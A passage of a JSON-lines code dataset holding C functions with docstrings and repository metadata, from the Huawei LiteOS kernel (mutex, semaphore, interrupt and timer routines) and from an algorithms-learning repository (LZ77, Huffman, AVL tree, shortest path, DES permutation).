(LOS_TASK_CB *)g_stLosTask.pstRunTask;\n    if (pstMuxPosted->usMuxCount == 0||pstMuxPosted->pstOwner != pstRunTsk)\n    {\n        LOS_IntRestore(uwIntSave);\n        return LOS_ERRNO_MUX_INVALID;\n    }\n\n    if (--(pstMuxPosted->usMuxCount) != 0)\n    {\n        LOS_IntRestore(uwIntSave);\n        return LOS_OK;\n    }\n\n    if ((pstMuxPosted->pstOwner->usPriority) != pstMuxPosted->usPriority)\n    {\n        osTaskPriModify(pstMuxPosted->pstOwner, pstMuxPosted->usPriority);\n    }\n\n    if (!LOS_ListEmpty(&pstMuxPosted->stMuxList))\n    {\n        pstResumedTask = OS_TCB_FROM_PENDLIST(LOS_DL_LIST_FIRST(&(pstMuxPosted->stMuxList))); /*lint !e413*/\n        LOS_ListDelete(LOS_DL_LIST_FIRST(&(pstMuxPosted->stMuxList)));\n        LOS_ASSERT_COND(pstResumedTask->usTaskStatus & OS_TASK_STATUS_PEND);\n        pstResumedTask->usTaskStatus &= (~OS_TASK_STATUS_PEND);\n        if (pstResumedTask->usTaskStatus & OS_TASK_STATUS_TIMEOUT)\n        {\n            osTimerListDelete(pstResumedTask);\n            pstResumedTask->usTaskStatus &= (~OS_TASK_STATUS_TIMEOUT);\n        }\n\n        pstMuxPosted->usMuxCount    = 1;\n        pstMuxPosted->pstOwner      = pstResumedTask;\n        pstMuxPosted->usPriority    = pstResumedTask->usPriority;\n        pstResumedTask->pTaskMux    = NULL;\n        if (!(pstResumedTask->usTaskStatus & OS_TASK_STATUS_SUSPEND))\n        {\n            pstResumedTask->usTaskStatus |= OS_TASK_STATUS_READY;\n            LOS_PriqueueEnqueue(&pstResumedTask->stPendList, pstResumedTask->usPriority);\n        }\n\n        (VOID)LOS_IntRestore(uwIntSave);\n        LOS_Schedule();\n    }\n    else\n    {\n        (VOID)LOS_IntRestore(uwIntSave);\n    }\n\n    return LOS_OK;\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/kernel/base/ipc/los_mux.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/*****************************************************************************\n Function    : LOS_HwiCreate\n Description : create hardware interrupt\n Input       : uwHwiNum   --- hwi num to create\n               usHwiPrio  --- priority of the hwi\n               usMode     --- unused\n               pfnHandler --- hwi handler\n               uwArg      --- param of the hwi handler\n Output      : None\n Return      : OS_SUCCESS on success or error code on failure\n *****************************************************************************/\n", "func_signal": "LITE_OS_SEC_TEXT_INIT UINT32 LOS_HwiCreate( HWI_HANDLE_T  uwHwiNum,\n                                      HWI_PRIOR_T   usHwiPrio,\n                                      HWI_MODE_T    usMode,\n                                      HWI_PROC_FUNC pfnHandler,\n                                      HWI_ARG_T     uwArg )", "code": "{\n    UINTPTR uvIntSave;\n\n    if (NULL == pfnHandler)\n    {\n        return OS_ERRNO_HWI_PROC_FUNC_NULL;\n    }\n    if (uwHwiNum >= OS_M4_IRQ_VECTOR_CNT)\n    {\n        return OS_ERRNO_HWI_NUM_INVALID;\n    }\n    if (m_pstHwiForm[uwHwiNum + OS_M4_SYS_VECTOR_CNT] != osHwiDefaultHandler)\n    {\n        return OS_ERRNO_HWI_ALREADY_CREATED;\n    }\n    if (usHwiPrio > OS_HWI_PRIO_LOWEST)\n    {\n        return OS_ERRNO_HWI_PRIO_INVALID;\n    }\n\n    uvIntSave = LOS_IntLock();\n\n    osSetVector(uwHwiNum, pfnHandler);\n\n    nvicSetIRQ(uwHwiNum);\n\n    nvicSetIrqPRI(uwHwiNum, usHwiPrio << 4);\n\n    LOS_IntRestore(uvIntSave);\n\n    return LOS_OK;\n\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/platform/cpu/arm/cortex-m4/los_hwi.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/*****************************************************************************\n Function     : LOS_SemDelete\n Description : Delete a semaphore,\n Input          : uwSemHandle--------- semaphore operation handle,\n Output       : None\n Return       : LOS_OK on success or error code on failure\n *****************************************************************************/\n", "func_signal": "LITE_OS_SEC_TEXT_INIT UINT32 LOS_SemDelete(UINT32 uwSemHandle)", "code": "{\n    UINT32      uwIntSave;\n    SEM_CB_S    *pstSemDeleted;\n\n   pstSemDeleted = GET_SEM(uwSemHandle);\n   uwIntSave = LOS_IntLock();\n   if ((uwSemHandle >= (UINT32)LOSCFG_BASE_IPC_SEM_LIMIT) ||\n        (0 == pstSemDeleted->usSemStat))\n   {\n        LOS_IntRestore(uwIntSave);\n        return LOS_ERRNO_SEM_INVALID;\n    }\n\n   if (!LOS_ListEmpty(&pstSemDeleted->stSemList))\n   {\n       LOS_IntRestore(uwIntSave);\n       return LOS_ERRNO_SEM_PENDED;\n    }\n\n   LOS_ListAdd(&g_stUnusedSemList, &pstSemDeleted->stSemList);\n   pstSemDeleted->usSemStat = OS_SEM_UNUSED;\n   LOS_IntRestore(uwIntSave);\n   return LOS_OK;\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/kernel/base/ipc/los_sem.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/*****************************************************************************\nFunction   : osSwTmrGetNextTimeout\nDescription: Get next timeout\nInput      : None\nOutput     : None\nReturn     : Count of the Timer list\n*****************************************************************************/\n", "func_signal": "LITE_OS_SEC_TEXT UINT32 osSwTmrGetNextTimeout(VOID)", "code": "{\n    if (m_pstSwtmrSortList == NULL)\n    {\n        return 0xFFFFFFFF;\n    }\n    return m_pstSwtmrSortList->uwCount;\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/kernel/base/core/los_swtmr.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/*****************************************************************************\n Function    : LOS_HwiDelete\n Description : Delete hardware interrupt\n Input       : uwHwiNum   --- hwi num to delete\n Output      : None\n Return      : LOS_OK on success or error code on failure\n *****************************************************************************/\n", "func_signal": "LITE_OS_SEC_TEXT_INIT UINT32 LOS_HwiDelete(HWI_HANDLE_T uwHwiNum)", "code": "{\n    UINT32 uwIntSave;\n\n    if (uwHwiNum >= OS_M4_IRQ_VECTOR_CNT)\n    {\n        return OS_ERRNO_HWI_NUM_INVALID;\n    }\n\n    nvicClrIRQ(uwHwiNum);\n\n    uwIntSave = LOS_IntLock();\n\n    m_pstHwiForm[uwHwiNum + OS_M4_SYS_VECTOR_CNT] = (HWI_PROC_FUNC)osHwiDefaultHandler;\n\n    LOS_IntRestore(uwIntSave);\n\n    return LOS_OK;\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/platform/cpu/arm/cortex-m4/los_hwi.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/*****************************************************************************\n Function     : LOS_SemPend\n Description  : Specified semaphore V operation,\n Input        : uwSemHandle--------- semaphore operation handle,\n Output       : None\n Return       : LOS_OK on success or error code on failure\n *****************************************************************************/\n", "func_signal": "LITE_OS_SEC_TEXT UINT32 LOS_SemPost(UINT32 uwSemHandle)", "code": "{\n    UINT32      uwIntSave;\n    SEM_CB_S    *pstSemPosted = GET_SEM(uwSemHandle);\n    LOS_TASK_CB *pstResumedTask;\n\n    if (uwSemHandle >= LOSCFG_BASE_IPC_SEM_LIMIT)\n    {\n        return LOS_ERRNO_SEM_INVALID;\n    }\n\n    uwIntSave = LOS_IntLock();\n\n    if (OS_SEM_UNUSED == pstSemPosted->usSemStat)\n    {\n        LOS_IntRestore(uwIntSave);\n        return LOS_ERRNO_SEM_INVALID;\n    }\n\n    if (OS_SEM_COUNT_MAX == pstSemPosted->uwSemCount )\n    {\n        (VOID)LOS_IntRestore(uwIntSave);\n        return LOS_ERRNO_SEM_OVERFLOW;\n    }\n    if (!LOS_ListEmpty(&pstSemPosted->stSemList))\n    {\n        pstResumedTask = OS_TCB_FROM_PENDLIST(LOS_DL_LIST_FIRST(&(pstSemPosted->stSemList))); /*lint !e413*/\n        LOS_ListDelete(LOS_DL_LIST_FIRST(&(pstSemPosted->stSemList)));\n        LOS_ASSERT_COND(pstResumedTask->usTaskStatus & OS_TASK_STATUS_PEND);\n        pstResumedTask->usTaskStatus &= (~OS_TASK_STATUS_PEND);\n        if (pstResumedTask->usTaskStatus & OS_TASK_STATUS_TIMEOUT)\n        {\n            osTimerListDelete(pstResumedTask);\n            pstResumedTask->usTaskStatus &= (~OS_TASK_STATUS_TIMEOUT);\n        }\n\n        pstResumedTask->pTaskSem = NULL;\n        if (!(pstResumedTask->usTaskStatus & OS_TASK_STATUS_SUSPEND))\n        {\n            pstResumedTask->usTaskStatus |= OS_TASK_STATUS_READY;\n            LOS_PriqueueEnqueue(&pstResumedTask->stPendList, pstResumedTask->usPriority);\n        }\n\n        (VOID)LOS_IntRestore(uwIntSave);\n        LOS_Schedule();\n    }\n    else\n    {\n        pstSemPosted->uwSemCount++;\n        (VOID)LOS_IntRestore(uwIntSave);\n    }\n\n    return LOS_OK;\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/kernel/base/ipc/los_sem.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/*****************************************************************************\n Function     : LOS_SemPend\n Description : Specified semaphore P operation,\n Input          : uwSemHandle--------- semaphore operation handle,\n \t\t     uwTimeout   ---------- waitting time\n Output       : None\n Return       : LOS_OK on success or error code on failure\n *****************************************************************************/\n", "func_signal": "LITE_OS_SEC_TEXT UINT32 LOS_SemPend(UINT32 uwSemHandle, UINT32 uwTimeout)", "code": "{\n    UINT32      uwIntSave;\n    SEM_CB_S    *pstSemPended;\n    UINT32      uwRetErr;\n    LOS_TASK_CB *pstRunTsk;\n    LOS_DL_LIST *pstPendObj;\n\n    pstSemPended = GET_SEM(uwSemHandle);\n    uwIntSave = LOS_IntLock();\n    if ((uwSemHandle >= (UINT32)LOSCFG_BASE_IPC_SEM_LIMIT) || (0 == pstSemPended->usSemStat))\n    {\n        LOS_IntRestore(uwIntSave);\n        return LOS_ERRNO_SEM_INVALID;\n    }\n\n    if (pstSemPended->uwSemCount > 0)\n    {\n        pstSemPended->uwSemCount--;\n        LOS_IntRestore(uwIntSave);\n        return LOS_OK;\n    }\n\n    if (!uwTimeout)\n    {\n        uwRetErr = LOS_ERRNO_SEM_UNAVAILABLE;\n        goto errre_uniSemPend;\n    }\n\n    if (OS_INT_ACTIVE)\n    {\n        uwRetErr = LOS_ERRNO_SEM_PEND_INTERR;\n        PRINT_ERR(\"!!!LOS_ERRNO_SEM_PEND_INTERR!!!\\n\");\n        goto errre_uniSemPend;\n    }\n\n    if (g_usLosTaskLock)\n    {\n        uwRetErr = LOS_ERRNO_SEM_PEND_IN_LOCK;\n        PRINT_ERR(\"!!!LOS_ERRNO_SEM_PEND_IN_LOCK!!!\\n\");\n        goto errre_uniSemPend;\n    }\n\n    pstRunTsk = (LOS_TASK_CB *)g_stLosTask.pstRunTask;\n    LOS_PriqueueDequeue(&pstRunTsk->stPendList);\n    pstRunTsk->usTaskStatus &= (~OS_TASK_STATUS_READY);\n    pstRunTsk->pTaskSem = (VOID *)pstSemPended;\n    pstPendObj = &pstRunTsk->stPendList;\n    pstRunTsk->usTaskStatus |= OS_TASK_STATUS_PEND;\n    LOS_ListTailInsert(&pstSemPended->stSemList, pstPendObj);\n    if (uwTimeout != LOS_WAIT_FOREVER)\n    {\n        pstRunTsk->usTaskStatus |= OS_TASK_STATUS_TIMEOUT;\n        osTaskAdd2TimerList((LOS_TASK_CB *)pstRunTsk, uwTimeout);\n    }\n    else\n    {\n        pstRunTsk->usTaskStatus &= (~OS_TASK_STATUS_TIMEOUT);\n    }\n\n    (VOID)LOS_IntRestore(uwIntSave);\n    LOS_Schedule();\n\n    if (pstRunTsk->usTaskStatus & OS_TASK_STATUS_TIMEOUT)\n    {\n        uwIntSave = LOS_IntLock();\n        pstRunTsk->usTaskStatus &= (~OS_TASK_STATUS_TIMEOUT);\n        (VOID)LOS_IntRestore(uwIntSave);\n        uwRetErr = LOS_ERRNO_SEM_TIMEOUT;\n        goto error_uniSemPend;\n    }\n\n    return LOS_OK;\n\nerrre_uniSemPend:\n    (VOID)LOS_IntRestore(uwIntSave);\nerror_uniSemPend:\n    return (uwRetErr);\n}", "path": "Huawei_LiteOS_Kernel/Huawei_LiteOS/kernel/base/ipc/los_sem.c", "commit_date": "2016-09-09 00:00:00", "repo_name": "Huawei/Huawei_LiteOS_Kernel", "stars": 567, "license": "bsd-3-clause", "language": "c", "size": 1197}
{"docstring": "/**\n \u786e\u5b9a\u5728\u524d\u5411\u7f13\u51b2\u533a\u4e0e\u6ed1\u52a8\u7a97\u53e3\u4e2d\u5339\u914d\u7684\u6700\u957f\u77ed\u8bed\n\n @param window \u6ed1\u52a8\u7a97\u53e3\n @param buffer \u524d\u5411\u7f13\u51b2\u533a\n @param offset \u6ed1\u52a8\u7a97\u53e3\u4e2d\u5339\u914d\u4e32\u7684\u4f4d\u7f6e\n @param next \u524d\u5411\u7f13\u51b2\u533a\u4e2d\u5339\u914d\u4e32\u540e\u4e00\u4f4d\u7684\u7b26\u53f7\n @return \u5339\u914d\u7684\u6700\u957f\u77ed\u8bed\u957f\u5ea6\n */\n", "func_signal": "static int compare_win(const unsigned char *window,\n                       const unsigned char *buffer,\n                       int *offset, unsigned char *next)", "code": "{\n\n  int       match, longest, i, j, k;\n\n  /// \u521d\u59cb\u5316 offset\uff0c\u5c3d\u7ba1\u53ea\u4f1a\u5728\u627e\u5230\u7ed3\u679c\u65f6\u8d4b\u503c\n  *offset = 0;\n\n  /// \u5982\u679c\u6ca1\u627e\u5230\u5339\u914d\uff0c\u5219\u8fd4\u56de 0 \u5e76\u5c06 next \u6307\u5411\u524d\u5411\u7f13\u51b2\u533a\n  longest = 0;\n  *next = buffer[0];\n\n  /// \u5728\u6ed1\u52a8\u7a97\u53e3\u4e2d\u627e\u5230\u524d\u5411\u7f13\u51b2\u533a\u7684\u6700\u4f73\u5339\u914d\n\n  for (k = 0; k < LZ77_WINDOW_SIZE; k++) {\n\n    i = k;\n    j = 0;\n    match = 0;\n\n    /// \u786e\u5b9a\u6709\u6ed1\u52a8\u7a97\u53e3\u504f\u79fb k \u4e2d\u6709\u591a\u5c11\u7b26\u53f7\u5339\u914d\n\n    while (i < LZ77_WINDOW_SIZE && j < LZ77_BUFFER_SIZE - 1) {\n\n      if (window[i] != buffer[j]) break;\n\n      match++;\n      i++;\n      j++;\n\n    }\n\n    /// \u4fdd\u5b58\u504f\u79fb\u91cf\uff0c\u957f\u5ea6\u4ee5\u53ca\u6700\u540e\u7b26\u53f7\u4f4d\u7f6e\n    if (match > longest) {\n\n      *offset = k;\n      longest = match;\n      *next = buffer[j];\n\n    }\n  }\n\n  return longest;\n}", "path": "LearningMasteringAlgorithms-C/source/lz77.c", "commit_date": "2018-12-07 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
{"docstring": "/**\n \u901a\u8fc7\u5b57\u8282\u9891\u7387\u5efa\u7acb\u970d\u592b\u66fc\u6811\n\n @param freqs \u7b26\u53f7\u9891\u7387\u6570\u7ec4\n @param tree \u6784\u5efa\u540e\u7684\u970d\u592b\u66fc\u6811\n @return \u6210\u529f\u8fd4\u56de 0, \u5426\u5219\u8fd4\u56de -1\n */\n", "func_signal": "static int build_tree(int *freqs, BiTree **tree)", "code": "{\n\n  BiTree      *init, *merge, *left, *right;\n  PQueue      pqueue;\n  HuffNode    *data;\n  int         size, c;\n\n  /// \u521d\u59cb\u5316\u4e8c\u53c9\u6811\u4f18\u5148\u961f\u5217\n\n  *tree = NULL;\n\n  pqueue_init(&pqueue, compare_freq, destroy_tree);\n\n  for (c = 0; c <= UCHAR_MAX; c++) {\n\n    if (freqs[c] != 0) {\n\n      /// \u521b\u5efa\u4e8c\u53c9\u6811\u5e76\u8bbe\u7f6e\u5f53\u524d\u7b26\u53f7\u548c\u9891\u7387\n\n      if ((init = (BiTree *)malloc(sizeof(BiTree))) == NULL) {\n\n        pqueue_destroy(&pqueue);\n        return -1;\n      }\n\n      bitree_init(init, free);\n\n      if ((data = (HuffNode *)malloc(sizeof(HuffNode))) == NULL) {\n\n        pqueue_destroy(&pqueue);\n        return -1;\n      }\n\n      data->symbol = c;\n      data->freq = freqs[c];\n\n      if (bitree_ins_left(init, NULL, data) != 0) {\n\n        free(data);\n        bitree_destroy(init);\n        free(init);\n        pqueue_destroy(&pqueue);\n        return -1;\n      }\n\n      /// \u63d2\u5165\u4e8c\u53c9\u6811\u5230\u4f18\u5148\u961f\u5217\n\n      if (pqueue_insert(&pqueue, init) != 0) {\n\n        bitree_destroy(init);\n        free(init);\n        pqueue_destroy(&pqueue);\n        return -1;\n      }\n    }\n  }\n\n  /// \u901a\u8fc7\u5408\u5e76\u4f18\u5148\u961f\u5217\u4e2d\u7684\u4e8c\u53c9\u6811\u6784\u5efa\u970d\u592b\u66fc\u6811\n\n  size = pqueue_size(&pqueue);\n\n  for (c = 1; c <= size - 1; c++) {\n\n    /// \u521b\u5efa\u5408\u5e76\u540e\u6811\u7684\u7a7a\u95f4\n\n    if ((merge = (BiTree *)malloc(sizeof(BiTree))) == NULL) {\n\n      pqueue_destroy(&pqueue);\n      return -1;\n\n    }\n\n    /// \u63d0\u53d6\u51fa\u4e24\u4e2a\u6839\u8282\u70b9\u6700\u5c0f\u7684\u4e24\u68f5\u4e8c\u53c9\u6811\n\n    if (pqueue_extract(&pqueue, (void **)&left) != 0) {\n\n      pqueue_destroy(&pqueue);\n      free(merge);\n      return -1;\n    }\n\n    if (pqueue_extract(&pqueue, (void **)&right) != 0) {\n\n      pqueue_destroy(&pqueue);\n      free(merge);\n      return -1;\n    }\n\n    /// \u521b\u5efa\u5408\u5e76\u540e\u6839\u8282\u70b9\u7684\u6570\u636e\u7a7a\u95f4\n\n    if ((data = (HuffNode *)malloc(sizeof(HuffNode))) == NULL) {\n\n      pqueue_destroy(&pqueue);\n      free(merge);\n      return -1;\n    }\n\n    memset(data, 0, sizeof(HuffNode));\n\n    /// \u8ba1\u7b97\u5df2\u7ecf\u5408\u5e76\u4e8c\u53c9\u6811\u6839\u8282\u70b9\u7684\u9891\u7387\u503c\uff08\u6c42\u548c\u5b50\u8282\u70b9\uff09\n\n    data->freq = ((HuffNode *)bitree_data(bitree_root(left)))->freq +\n                 ((HuffNode *)bitree_data(bitree_root(right)))->freq;\n\n    /// \u5408\u5e76\u4e24\u68f5\u6811\n\n    if (bitree_merge(merge, left, right, data) != 0) {\n\n      pqueue_destroy(&pqueue);\n      free(merge);\n      return -1;\n    }\n\n    /// \u5c06\u5408\u5e76\u7684\u4e8c\u53c9\u6811\u63d2\u5165\u56de\u4f18\u5148\u961f\u5217\u5e76\u91ca\u653e\u76f8\u5173\u7684\u7a7a\u95f4\n\n    if (pqueue_insert(&pqueue, merge) != 0) {\n\n      pqueue_destroy(&pqueue);\n      bitree_destroy(merge);\n      free(merge);\n      return -1;\n    }\n\n    free(left);\n    free(right);\n  }\n\n  /// \u4f18\u5148\u961f\u5217\u4e2d\u5269\u4f59\u7684\u6700\u540e\u4e00\u68f5\u4e8c\u53c9\u6811\u5c31\u662f\u970d\u592b\u66fc\u6811\n\n  if (pqueue_extract(&pqueue, (void **)tree) != 0) {\n\n    pqueue_destroy(&pqueue);\n    return -1;\n\n  } else {\n\n    pqueue_destroy(&pqueue);\n  }\n\n  return 0;\n}", "path": "LearningMasteringAlgorithms-C/source/huffman.c", "commit_date": "2017-05-18 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
{"docstring": "/**\n \u91ca\u653e\u6240\u9009\u9876\u70b9\u4e0e\u76f8\u90bb\u9876\u70b9\u95f4\u7684\u8fb9\n\n @param u \u9876\u70b9 1\n @param v \u9876\u70b9 2\n @param weight \u6743\u91cd\n */\n", "func_signal": "static void relax(PathVertex *u, PathVertex *v, double weight)", "code": "{\n  /// \u91ca\u653e\u9876\u70b9 u \u548c v \u4e4b\u95f4\u7684\u8fb9\n\n  if (v->d > u->d + weight) {\n\n    v->d = u->d + weight;\n    v->parent = u;\n  }\n  return;\n}", "path": "LearningMasteringAlgorithms-C/source/shortest.c", "commit_date": "2017-05-24 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
{"docstring": "/**\n \u79fb\u9664\u7531 tree \u6307\u5b9a\u4e8c\u53c9\u6811\u4e2d node \u7684\u53f3\u5b50\u7ed3\u70b9\u4e3a\u6839\u7684\u5b50\u6811\n\n @param tree \u641c\u7d22\u4e8c\u53c9\u6811\n @param node \u6307\u5b9a\u7ed3\u70b9\n */\n", "func_signal": "static void destroy_right(BisTree *tree, BiTreeNode *node)", "code": "{\n  BiTreeNode         **position;\n\n  /// \u4e0d\u5141\u8bb8\u5728\u7a7a\u6811\u4e2d\u6267\u884c\u79fb\u9664\n  if (bitree_size(tree) == 0) return;\n\n  /// \u786e\u5b9a\u79fb\u9664\u7ed3\u70b9\u7684\u4f4d\u7f6e\n  if (node == NULL) {\n    position = &tree->root;\n  } else {\n    position = &node->right;\n  }\n\n  /// \u79fb\u9664\u7ed3\u70b9\n  if (*position != NULL) {\n\n    destroy_left(tree, *position);\n    destroy_right(tree, *position);\n\n    if (tree->destroy != NULL) {\n      /// \u6267\u884c\u7528\u6237\u6307\u5b9a\u7684 destroy \u51fd\u6570\n      tree->destroy(((AvlNode *)(*position)->data)->data);\n    }\n\n    /// \u6e05\u7406 AVL \u6570\u636e\u7ed3\u6784\u548c\u7ed3\u70b9\u6570\u636e\n    free((*position)->data);\n    free(*position);\n    *position = NULL;\n\n    /// \u66f4\u65b0\u6811\u7684 size\n    tree->size--;\n  }\n\n  return;\n}", "path": "LearningMasteringAlgorithms-C/source/bistree.c", "commit_date": "2017-05-04 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
{"docstring": "/**\n \u5728 tree \u6240\u6307\u5b9a\u4e8c\u53c9\u6811\u4e2d\u63d2\u5165\u4e00\u4e2a node \u6240\u6307\u5b9a\u7ed3\u70b9\n\n @param tree \u4e8c\u53c9\u641c\u7d22\u6811\n @param node \u6307\u5b9a\u7684\u7ed3\u70b9\n @param data \u7ed3\u70b9\u6570\u636e\n @param balanced \u662f\u5426\u5df2\u7ecf\u5e73\u8861\uff08\u5df2\u5e73\u8861\u4e3a 1\uff0c\u672a\u5e73\u8861\u4e3a 0\uff09\n @return \u63d2\u5165\u6210\u529f\uff0c\u8fd4\u56de0\uff1b\u5df2\u5b58\u5728\uff0c\u8fd4\u56de1\uff1b\u5426\u5219\u8fd4\u56de-1\n */\n", "func_signal": "static int insert(BisTree *tree, BiTreeNode **node, const void *data, int *balanced)", "code": "{\n  AvlNode   *avl_data;\n  int       cmpval, retval;\n\n  /// \u5c06\u6570\u636e\u63d2\u5165\u5230\u6811\u4e2d\n\n  if (bitree_is_eob(*node)) {\n\n    /// \u5904\u7406\u63d2\u5165\u7a7a\u6811\u7684\u60c5\u51b5\n\n    if ((avl_data = (AvlNode *)malloc(sizeof(AvlNode))) == NULL) return -1;\n\n    avl_data->factor = AVL_BALANCED;\n    avl_data->hidden = 0;\n    avl_data->data = (void *)data;\n\n    return bitree_ins_left(tree, *node, avl_data);\n\n  } else {\n\n    /// \u5904\u7406\u975e\u7a7a\u6811\u60c5\u51b5\n\n    cmpval = tree->compare(data, ((AvlNode *)bitree_data(*node))->data);\n\n    if (cmpval < 0) {\n\n      /// \u5904\u7406\u5de6\u5b50\u6811\n\n      if (bitree_is_eob(bitree_left(*node))) {\n\n        if ((avl_data = (AvlNode *)malloc(sizeof(AvlNode))) == NULL) return -1;\n\n        avl_data->factor = AVL_BALANCED;\n        avl_data->hidden = 0;\n        avl_data->data = (void *)data;\n\n        if (bitree_ins_left(tree, *node, avl_data) != 0) return -1;\n\n        *balanced = 0;\n\n      } else {\n\n        if ((retval = insert(tree, &bitree_left(*node), data, balanced)) != 0) return retval;\n      }\n\n      /// \u786e\u4fdd\u6811\u4f9d\u7136\u4fdd\u6301\u5e73\u8861\n      if (!(*balanced)) {\n\n        switch (((AvlNode *)bitree_data(*node))->factor) {\n\n          case AVL_LFT_HEAVY:\n\n            rotate_left(node);\n            *balanced = 1;\n            break;\n\n          case AVL_BALANCED:\n\n            ((AvlNode *)bitree_data(*node))->factor = AVL_LFT_HEAVY;\n            break;\n\n          case AVL_RGT_HEAVY:\n\n            ((AvlNode *)bitree_data(*node))->factor = AVL_BALANCED;\n            *balanced = 1;\n\n        }\n      }\n\n    } else if (cmpval > 0) {\n\n      /// \u5904\u7406\u53f3\u5b50\u6811\n\n      if (bitree_is_eob(bitree_right(*node))) {\n\n        if ((avl_data = (AvlNode *)malloc(sizeof(AvlNode))) == NULL)\n          return -1;\n\n        avl_data->factor = AVL_BALANCED;\n        avl_data->hidden = 0;\n        avl_data->data = (void *)data;\n\n        if (bitree_ins_right(tree, *node, avl_data) != 0)\n          return -1;\n\n        *balanced = 0;\n\n      } else {\n\n        if ((retval = insert(tree, &bitree_right(*node), data, balanced)) != 0) return retval;\n      }\n\n      /// \u786e\u4fdd\u6811\u4f9d\u7136\u4fdd\u6301\u5e73\u8861\n      if (!(*balanced)) {\n\n        switch (((AvlNode *)bitree_data(*node))->factor) {\n\n          case AVL_LFT_HEAVY:\n\n            ((AvlNode *)bitree_data(*node))->factor = AVL_BALANCED;\n            *balanced = 1;\n            break;\n\n          case AVL_BALANCED:\n\n            ((AvlNode *)bitree_data(*node))->factor = AVL_RGT_HEAVY;\n            break;\n\n          case AVL_RGT_HEAVY:\n\n            rotate_right(node);\n            *balanced = 1;\n\n        }\n      }\n\n    } else {\n\n      /// \u5904\u7406\u627e\u5230\u8282\u70b9\u7684\u60c5\u51b5\n\n      ///\u5982\u679c\u627e\u5230\u975e\u9690\u85cf\u8282\u70b9\u76f4\u63a5\u8fd4\u56de 1\n      if (!((AvlNode *)bitree_data(*node))->hidden) return 1;\n\n      ///\u63d2\u5165\u65b0\u6570\u636e\u5e76\u53d6\u6d88\u9690\u85cf\n      if (tree->destroy != NULL) {\n        /// \u9500\u6bc1\u9690\u85cf\u8282\u70b9\u7684\u6570\u636e\n        tree->destroy(((AvlNode *)bitree_data(*node))->data);\n      }\n\n      ((AvlNode *)bitree_data(*node))->data = (void *)data;\n      ((AvlNode *)bitree_data(*node))->hidden = 0;\n\n      ///\u5982\u679c\u662f\u9690\u85cf\u8282\u70b9\u6570\u636e\u66ff\u6362\uff0c\u5219\u4e0d\u9700\u8981\u518d\u6b21\u5e73\u8861\u6811\n      *balanced = 1;\n    }\n  }\n\n  return 0;\n}", "path": "LearningMasteringAlgorithms-C/source/bistree.c", "commit_date": "2017-05-04 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
{"docstring": "/**\n \u9500\u6bc1\u970d\u592b\u66fc\u6811\n\n @param tree \u970d\u592b\u66fc\u6811\n */\n", "func_signal": "static void destroy_tree(void *tree)", "code": "{\n  /// \u9500\u6bc1\u5e76\u56de\u6536\u4e00\u68f5\u4e8c\u53c9\u6811\u7a7a\u95f4\n  bitree_destroy(tree);\n  free(tree);\n\n  return;\n}", "path": "LearningMasteringAlgorithms-C/source/huffman.c", "commit_date": "2017-05-18 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
{"docstring": "/**\n \u6839\u636e\u4e00\u4e2a\u7279\u5b9a\u7684\u8868\u5728\u4e00\u4e2a\u7f13\u51b2\u533a\u4e2d\u7f6e\u6362\u4f4d\n\n @param bits \u7f13\u51b2\u533a\n @param mapping \u7279\u5b9a\u7684\u7f6e\u6362\u8868\n @param n \u4f4d\u6570\n */\n", "func_signal": "static void permute(unsigned char *bits, const int *mapping, int n)", "code": "{\n  unsigned char   temp[8];\n  int             i;\n\n  /// \u5bf9\u7f13\u51b2\u533a\u4e2d n \u6761\u6570\u636e\u8fdb\u884c\u7f6e\u6362\u64cd\u4f5c\n\n  memset(temp, 0, (int)ceil(n / 8));\n\n  for (i = 0; i < n; i++) {\n    bit_set(temp, i, bit_get(bits, mapping[i] - 1));\n  }\n\n  memcpy(bits, temp, (int)ceil(n / 8));\n\n  return;\n}", "path": "LearningMasteringAlgorithms-C/source/des.c", "commit_date": "2017-05-22 00:00:00", "repo_name": "yourtion/LearningMasteringAlgorithms-C", "stars": 729, "license": "mit", "language": "c", "size": 604}
